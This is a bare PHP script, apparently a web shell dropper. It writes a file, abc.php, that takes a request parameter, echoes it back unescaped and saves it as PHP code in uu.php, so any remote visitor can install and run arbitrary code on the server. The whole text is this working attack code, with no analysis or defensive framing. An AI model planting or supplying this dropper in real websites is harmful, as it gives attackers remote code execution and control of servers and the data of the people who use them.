<?php $x = '<?php if(isset($_REQUEST[\'abc\'])){$abc = ($_REQUEST[\'abc\']); echo $abc; }; file_put_contents("uu.php", "<?php " . $abc . " ?>"); ?>'; file_put_contents("abc.php", $x); ?>
